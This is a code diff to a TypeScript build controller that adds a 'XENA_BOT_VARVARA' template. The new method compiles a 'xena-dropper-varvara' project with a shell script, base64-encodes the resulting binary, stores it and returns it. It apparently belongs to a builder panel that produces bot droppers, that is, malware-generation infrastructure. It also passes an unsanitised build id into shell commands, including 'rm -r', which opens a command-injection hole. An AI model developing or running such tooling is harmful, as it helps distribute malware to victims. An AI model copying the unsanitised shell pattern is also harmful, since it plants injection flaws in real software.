@@ -78,6 +78,12 @@ export default class BuildsController {
           ? response.ok(anaconda)
           : response.internalServerError({ success: false, message: 'Failed to build.' })
 
+      case 'XENA_BOT_VARVARA':
+        const varvara = await this.buildVarvara(buildId, buildProfileId)
+        return varvara
+          ? response.ok(varvara)
+          : response.internalServerError({ success: false, message: 'Failed to build.' })
+
       default:
         return response.unprocessableEntity({ success: false, message: 'Unrecognized build template.' })
     }
@@ -89,6 +95,46 @@ export default class BuildsController {
 
   public delete = async ({}: HttpContextContract) => {
     // todo
+  }
+
+  private buildVarvara = async (buildId: string, buildProfileId: string) => {
+    // Build the binary.
+    const buildOutput = (() => {
+      const buildCommand =
+        `cd ${Service.Git.pathPrefix}${buildId}/droppers/xena-dropper-varvara && sh build.sh`
+      try {
+        return Helper.Shell.exe(buildCommand)
+      } catch (e) {
+        console.warn(e)
+        return 'ERROR'
+      }
+    })()
+
+    if (buildOutput == 'ERROR')
+      throw Error('Unable to build.')
+
+    const botLocation = `${Env.get('BUILD_DESTINATION')}${buildId}/droppers/xena-dropper-varvara/build/cpp/Main`
+
+    // Base64 binary.
+    const base64Binary = await Domain.Build.getBinary(botLocation)
+
+    // Store the build.
+    const build = await Repo.Build.insert( Domain.Build.fromJSON({
+      id: buildId,
+      buildProfileId, 
+      data: base64Binary,
+    })).then(build => Domain.Build.fromJSON(build))
+
+    // Repo cleaning.
+    try {
+      Helper.Shell.exe(`rm -r ${Service.Git.pathPrefix}${buildId}`)
+    } catch (e) {
+      console.warn(e)
+      return 'ERROR'
+    }
+
+    // Return the build binary.
+    return build.toBinary
   }
 
   private buildAnaconda = async (buildId: string, buildProfileId: string) => {
